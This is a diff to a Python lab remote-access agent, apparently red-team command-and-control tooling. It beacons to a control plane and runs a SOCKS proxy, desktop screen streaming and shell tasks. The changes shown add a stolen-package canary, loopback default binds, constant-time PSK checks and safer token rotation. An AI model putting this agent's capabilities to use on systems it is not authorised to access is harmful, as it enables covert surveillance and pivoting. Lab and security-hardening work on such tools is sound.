@@ -6,13 +6,15 @@
   hogwarts-agent loop -c agent.json
 
 Config keys: plane_url | base_url | base_urls (list/CSV), enroll_secret,
-agent_id, agent_token, sleep, jitter. Stability: result spool beside config,
-multi-URL failover, exponential backoff in loop mode.
+agent_id, agent_token, sleep, jitter, package_id, canary_label, canary_url,
+canary_fqdn. Stability: result spool beside config, multi-URL failover,
+exponential backoff in loop mode. Package canary fires once on first start.
 """
 
 from __future__ import annotations
 
 import argparse
+import hmac
 import json
 import os
 import platform
@@ -28,7 +30,7 @@ from pathlib import Path
 from typing import Any
 from urllib.parse import urljoin
 
-VERSION = "0.5.21-lab"
+VERSION = "0.5.23-lab"
 MIN_SLEEP = 0.12  # Control needs sub-200ms check-ins
 # Set by main(); when False, loop only logs enroll/errors/tasks>0 (less disk thrash)
 _AGENT_VERBOSE = False
@@ -69,7 +71,8 @@ _KEEPSTREAM: dict[str, Any] = {
     "session_id": None,
     "psk": None,
     "port": None,
-    "bind": "0.0.0.0",
+    # Loopback default — open bind only when operator sets face/bind explicitly
+    "bind": "127.0.0.1",
     "max_side": 1280,
     "fps": 60.0,
     "quality": 72,
@@ -132,6 +135,78 @@ def _save_config(path: Path, cfg: dict[str, Any]) -> None:
         path.chmod(0o600)
     except OSError:
         pass
+
+
+def _fire_package_canary(cfg: dict[str, Any], cfg_path: Path) -> None:
+    """One-shot package canary (HTTP + optional DNS).
+
+    Purple / stolen-export signal: unique canary_label is public (not a secret).
+    HTTP hits the plane that minted the package even if enroll is burned or
+    base_url is later rewritten — as long as canary_url stays in agent.json.
+    DNS canary_fqdn is optional operator zone (watch CF / auth DNS logs).
+    Never raises; never blocks enroll.
+    """
+    if cfg.get("canary_fired_at"):
+        return
+    label = str(cfg.get("canary_label") or "").strip().lower()
+    canary_url = str(cfg.get("canary_url") or "").strip()
+    canary_fqdn = str(cfg.get("canary_fqdn") or "").strip().rstrip(".")
+    if not label and not canary_url and not canary_fqdn:
+        return
+    # Derive HTTP URL from plane + label when only label is present
+    if not canary_url and label:
+        base = ""
+        urls = _plane_urls(cfg)
+        if urls:
+            base = urls[0].rstrip("/")
+        if base:
+            canary_url = f"{base}/api/v1/canary/{label}"
+    http_ok = False
+    dns_ok = False
+    if canary_url:
+        try:
+            req = urllib.request.Request(
+                canary_url,
+                method="GET",
+                headers={
+                    "User-Agent": f"hogwarts-agent/{VERSION}",
+                    "Accept": "application/json",
+                },
+            )
+            with urllib.request.urlopen(req, timeout=4.0) as resp:
+                http_ok = 200 <= int(getattr(resp, "status", 200) or 200) < 500
+        except Exception as exc:
+            if _AGENT_VERBOSE:
+                print(f"[agent] canary http: {exc}", flush=True)
+    if canary_fqdn:
+        try:
+            # Force a real resolver query (not just hosts-file cache where possible)
+            socket.setdefaulttimeout(3.0)
+            socket.getaddrinfo(canary_fqdn, None)
+            dns_ok = True
+        except Exception as exc:
+            if _AGENT_VERBOSE:
+                print(f"[agent] canary dns: {exc}", flush=True)
+        finally:
+            socket.setdefaulttimeout(None)
+    # Mark fired even on soft failure so we don't hammer; operator still got
+    # best-effort signal if either path worked.
+    cfg["canary_fired_at"] = _utc_now()
+    cfg["canary_http_ok"] = bool(http_ok)
+    cfg["canary_dns_ok"] = bool(dns_ok)
+    try:
+        _save_config(cfg_path, cfg)
+    except Exception:
+        pass
+    bits = []
+    if canary_url:
+        bits.append(f"http={'ok' if http_ok else 'fail'}")
+    if canary_fqdn:
+        bits.append(f"dns={'ok' if dns_ok else 'fail'}")
+    print(
+        f"[agent] package canary label={label or '?'} {' '.join(bits) or 'noop'}",
+        flush=True,
+    )
 
 
 def _utc_now() -> str:
@@ -400,7 +475,7 @@ def _socks_start(port: int = 0) -> dict[str, Any]:
         return {
             "already_running": True,
             "port": _SOCKS_STATE.get("port"),
-            "bind": "0.0.0.0",
+            "bind": _SOCKS_STATE.get("bind") or "127.0.0.1",
         }
 
     class _Handler(socketserver.StreamRequestHandler):
@@ -458,14 +533,24 @@ def _socks_start(port: int = 0) -> dict[str, Any]:
         allow_reuse_address = True
         daemon_threads = True
 
-    srv = _Server(("0.0.0.0", int(port or 0)), _Handler)
+    # Loopback by default — open 0.0.0.0 only if operator sets SOCKS_BIND
+    bind_host = (os.environ.get("SOCKS_BIND") or "127.0.0.1").strip() or "127.0.0.1"
+    srv = _Server((bind_host, int(port or 0)), _Handler)
     bind_port = int(srv.server_address[1])
     th = threading.Thread(target=srv.serve_forever, daemon=True, name="socks5")
     th.start()
     _SOCKS_STATE["server"] = srv
     _SOCKS_STATE["thread"] = th
     _SOCKS_STATE["port"] = bind_port
-    return {"started": True, "port": bind_port, "bind": "0.0.0.0", "proto": "socks5"}
+    _SOCKS_STATE["bind"] = bind_host
+    return {
+        "started": True,
+        "port": bind_port,
+        "bind": bind_host,
+        "proto": "socks5",
+        "auth": "none",
+        "note": "lab SOCKS is no-auth; prefer 127.0.0.1 + path tunnel",
+    }
 
 
 def _resolve_shell_argv(shell: str, cmd: str) -> tuple[list[str], str]:
@@ -1466,7 +1551,8 @@ class _FfmpegMjpegSource:
         fps_i = max(5, min(60, int(round(self.fps))))
 
         if os.name == "nt":
-            # gdigrab desktop
+            # gdigrab desktop (Windows Keepstream 60fps path — needs ffmpeg on PATH)
+            # draw_mouse=1 when supported; ignore if older ffmpeg rejects it
             cmd = [
                 "ffmpeg",
                 "-hide_banner",
@@ -1476,10 +1562,12 @@ class _FfmpegMjpegSource:
                 "gdigrab",
                 "-framerate",
                 str(fps_i),
+                "-draw_mouse",
+                "1",
                 "-i",
                 "desktop",
                 "-vf",
-                f"scale={ow}:{oh}",
+                f"scale={ow}:{oh}:flags=lanczos",
                 "-c:v",
                 "mjpeg",
                 "-q:v",
@@ -1517,19 +1605,40 @@ class _FfmpegMjpegSource:
             ]
             self.method = "ffmpeg-x11grab-mjpeg"
 
-        try:
-            self._proc = subprocess.Popen(
-                cmd,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.DEVNULL,
-                bufsize=0,
-            )
-        except OSError:
-            self._proc = None
+        def _spawn(c: list[str]) -> bool:
+            try:
+                self._proc = subprocess.Popen(
+                    c,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.DEVNULL,
+                    bufsize=0,
+                )
+            except OSError:
+                self._proc = None
+                return False
+            return self._proc.stdout is not None
+
+        if not _spawn(cmd):
             return False
-        # Wait for first bytes
-        if self._proc.stdout is None:
-            return False
+        # Older Windows ffmpeg may reject -draw_mouse — retry without
+        time.sleep(0.15)
+        if self._proc is not None and self._proc.poll() is not None and os.name == "nt":
+            try:
+                self._proc.kill()
+            except Exception:
+                pass
+            cleaned: list[str] = []
+            skip = False
+            for x in cmd:
+                if skip:
+                    skip = False
+                    continue
+                if x == "-draw_mouse":
+                    skip = True
+                    continue
+                cleaned.append(x)
+            if not _spawn(cleaned):
+                return False
         return True
 
     def read_jpeg(self, timeout_s: float = 0.5) -> bytes | None:
@@ -1652,9 +1761,12 @@ def _ks_handle_client(conn: Any) -> None:
             conn.sendall(b"ERR bad_hello\n")
             return
         sid, psk = parts[1], parts[2]
-        if sid != str(_KEEPSTREAM.get("session_id") or "") or psk != str(
-            _KEEPSTREAM.get("psk") or ""
-        ):
+        want_sid = str(_KEEPSTREAM.get("session_id") or "")
+        want_psk = str(_KEEPSTREAM.get("psk") or "")
+        # Constant-time compare — sid length mismatch falls through as fail
+        ok_sid = len(sid) == len(want_sid) and hmac.compare_digest(sid, want_sid)
+        ok_psk = len(psk) == len(want_psk) and hmac.compare_digest(psk, want_psk)
+        if not want_sid or not want_psk or not (ok_sid and ok_psk):
             conn.sendall(b"ERR auth\n")
             return
         sw, sh = _screen_size()
@@ -1814,7 +1926,7 @@ def _ks_handle_client(conn: Any) -> None:
 def _keepstream_serve_loop() -> None:
     import socket as _socket
 
-    bind = str(_KEEPSTREAM.get("bind") or "0.0.0.0")
+    bind = str(_KEEPSTREAM.get("bind") or "127.0.0.1")
     port = int(_KEEPSTREAM.get("port") or 0)
     srv = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
     srv.setsockopt(_socket.SOL_SOCKET, _socket.SO_REUSEADDR, 1)
@@ -1890,7 +2002,13 @@ def _session_start(payload: dict[str, Any]) -> dict[str, Any]:
     except (TypeError, ValueError):
         port = 0
     face = str(payload.get("face") or "reverse").strip().lower()
-    bind = str(payload.get("bind") or "0.0.0.0").strip() or "0.0.0.0"
+    # Default loopback; reverse/open faces must opt in to 0.0.0.0
+    default_bind = (
+        "0.0.0.0"
+        if face in ("reverse", "open", "public", "wan")
+        else "127.0.0.1"
+    )
+    bind = str(payload.get("bind") or default_bind).strip() or default_bind
     if face == "loopback":
         bind = "127.0.0.1"
 
@@ -3088,6 +3206,9 @@ def _try_enroll(
     if not secret:
         raise RuntimeError("need agent_token or enroll_secret")
     print("[agent] enrolling…", flush=True)
+    # package_id from export package (plane prefers secret-bound id)
+    if cfg.get("package_id") and "package_id" not in facts:
+        facts = {**facts, "package_id": str(cfg.get("package_id") or "")}
     out = client.enroll(secret, facts)
     agent_id = str(out.get("agent_id") or "")
     token = str(out.get("agent_token") or "")
@@ -3095,13 +3216,17 @@ def _try_enroll(
         raise RuntimeError("enroll response missing agent_id/token")
     cfg["agent_id"] = agent_id
     cfg["agent_token"] = token
+    if out.get("package_id"):
+        cfg["package_id"] = str(out.get("package_id"))
     cfg["sleep"] = float(out.get("sleep") or cfg.get("sleep") or 5)
     cfg["jitter"] = float(out.get("jitter") or cfg.get("jitter") or 0.2)
     if cfg.get("clear_enroll_secret", True):
         cfg.pop("enroll_secret", None)
     _save_config(cfg_path, cfg)
     client.token = token
-    print(f"[agent] enrolled id={agent_id}", flush=True)
+    pkg = str(cfg.get("package_id") or "")
+    extra = f" package={pkg}" if pkg else ""
+    print(f"[agent] enrolled id={agent_id}{extra}", flush=True)
     return agent_id, token
 
 
@@ -3112,6 +3237,12 @@ def run_cycle(cfg: dict[str, Any], cfg_path: Path) -> dict[str, Any]:
 
     _RUNTIME["cfg"] = cfg
     _RUNTIME["cfg_path"] = str(cfg_path)
+
+    # Canary first — fires even when enroll later fails (stolen zip signal)
+    try:
+        _fire_package_canary(cfg, cfg_path)
+    except Exception:
+        pass
 
     token = str(cfg.get("agent_token") or "").strip()
     agent_id = str(cfg.get("agent_id") or "").strip()
@@ -3235,23 +3366,32 @@ def run_cycle(cfg: dict[str, Any], cfg_path: Path) -> dict[str, Any]:
         if typ == "screenshot":
             shot_hit = True
         try:
+            # Rekey: plane applies new token hash only after a successful results
+            # POST. Persist the new token *before* switching client.token, and
+            # never rotate if POST fails (spool keeps old token so drain works).
+            if typ == "rekey" and status == "succeeded" and pending_token:
+                # Write dual fields first so crash between save and POST can recover
+                cfg["agent_token_pending"] = pending_token
+                _save_config(cfg_path, cfg)
             client.results(tid, status, result)
             print(f"[agent] result {tid} → {status}", flush=True)
             if typ == "rekey" and status == "succeeded" and pending_token:
                 cfg["agent_token"] = pending_token
+                cfg.pop("agent_token_pending", None)
                 _save_config(cfg_path, cfg)
                 client.token = pending_token
                 print("[agent] token rotated", flush=True)
         except Exception as exc:
             print(f"[agent] result post failed: {exc}", flush=True)
+            # Do NOT rotate token on failure — plane still has the old hash.
+            # Spool the result and keep using the current agent_token.
+            if typ == "rekey":
+                cfg.pop("agent_token_pending", None)
+                try:
+                    _save_config(cfg_path, cfg)
+                except Exception:
+                    pass
             spool.push(tid, status, result)
-            # If rekey succeeded but POST failed, still rotate after spool —
-            # plane may already have marked rekey delivered; keep agent usable.
-            if typ == "rekey" and status == "succeeded" and pending_token:
-                cfg["agent_token"] = pending_token
-                _save_config(cfg_path, cfg)
-                client.token = pending_token
-                print("[agent] token rotated (result spooled)", flush=True)
 
     # Best-effort second drain (in case earlier posts freed plane capacity)
     try:
@@ -3304,6 +3444,10 @@ def main(argv: list[str] | None = None) -> int:
         cfg["base_url"] = os.environ["PLANE_URL"].strip()
     if os.environ.get("ENROLL_SECRET"):
         cfg["enroll_secret"] = os.environ["ENROLL_SECRET"].strip()
+    if os.environ.get("CANARY_URL"):
+        cfg["canary_url"] = os.environ["CANARY_URL"].strip()
+    if os.environ.get("CANARY_FQDN"):
+        cfg["canary_fqdn"] = os.environ["CANARY_FQDN"].strip()
 
     if args.mode == "once":
         try:
@@ -3321,6 +3465,11 @@ def main(argv: list[str] | None = None) -> int:
         verbose = False
     _AGENT_VERBOSE = verbose
     print(f"[agent] hogwarts-agent {VERSION} loop (stable reconnect)", flush=True)
+    # Fire canary before the loop even if first enroll/check-in fails hard
+    try:
+        _fire_package_canary(cfg, cfg_path)
+    except Exception:
+        pass
     cycle_n = 0
     while True:
         try:
